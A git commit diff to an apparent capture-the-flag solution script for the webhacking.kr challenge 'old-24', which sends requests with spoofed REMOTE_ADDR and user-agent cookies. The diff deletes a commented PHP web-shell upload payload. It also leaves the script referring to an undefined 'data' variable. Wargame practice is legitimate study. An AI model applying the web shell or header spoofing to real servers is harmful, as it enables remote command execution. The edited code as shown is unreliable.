2c94b5f4db1781e424b93d8deb64641432713a93
Avishai Gonen <116498946+avishaigonen123@users.noreply.github.com>
2024-11-02 23:04:47 +0200

    Update old-24.py

--- webhacking.kr/scripts/old-24.py
+++ webhacking.kr/scripts/old-24.py
@@ -17,16 +17,7 @@ URL = "https://webhacking.kr/challenge/bonus-4/"
 SESSION_ID = "123"
 cookies = {'PHPSESSID':SESSION_ID, 'REMOTE_ADDR':"17.27.70.12.00.12.00.12.1",'HTTP_USER_AGENT':"" }
 
-data = { "kk": hashlib.md5("python-requests/2.31.0".encode()).hexdigest() }
-params ={}
-# answer=""
-# for i in range(97,123,2):
-#     answer +=chr(i)
-# print(answer)
-# params = {"ans":answer}
-# files = {'file':('bla.php','<?php echo system($_GET[\'cmd\']) ?>')}
-
-response = requests.post(URL,params=params,data=data, cookies=cookies)
+response = requests.post(URL,data=data, cookies=cookies)
 print(response.text)
 
     
